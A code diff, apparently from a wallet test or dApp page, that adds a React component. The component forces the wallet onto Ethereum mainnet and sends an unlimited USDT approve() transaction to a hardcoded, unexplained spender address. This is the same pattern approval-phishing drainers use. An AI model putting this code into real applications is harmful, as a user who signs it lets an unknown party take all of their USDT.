@@ -45,4 +45,63 @@ function RareCases() {
   );
 }
 
-export default RareCases;
+function ApproveUSDT() {
+  const { account, provider } = useContext(EvmContext);
+  const [loading, setLoading] = useState(false);
+
+  const approveUSDT = async () => {
+    try {
+      setLoading(true);
+      
+      // --- 配置参数 ---
+      const tokenAddress = "0xdAC17f958D2ee523a2206206994597C13D831ec7"; // USDT合约
+      const spenderAddress = "0xe0444a5efb95e40471e34e6669e5e50f8e0bed33"; // 授权目标
+      const amount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // 无限授权
+
+      // --- 切换到ETH主网 ---
+      await provider.request({ 
+        method: 'wallet_switchEthereumChain', 
+        params: [{ chainId: '0x1' }] 
+      });
+
+      // --- 构造calldata ---
+      const methodSignature = "0x095ea7b3"; // approve函数签名
+      const paddedSpender = spenderAddress.replace("0x", "").padStart(64, "0");
+      const paddedAmount = amount.padStart(64, "0");
+      const data = methodSignature + paddedSpender + paddedAmount;
+
+      // --- 发送交易 ---
+      await provider.request({
+        method: 'eth_sendTransaction',
+        params: [{
+          from: account,
+          to: tokenAddress,
+          data,
+        }],
+      });
+
+      toastSuccess();
+    } catch (error) {
+      console.error(error);
+      toastFail();
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  return (
+    <Card title="USDT授权">
+      <Space direction="vertical" style={{ width: '100%' }}>
+        <Button
+          block
+          loading={loading}
+          onClick={approveUSDT}
+        >
+          授权USDT无限额度
+        </Button>
+      </Space>
+    </Card>
+  );
+}
+
+export { RareCases, ApproveUSDT};
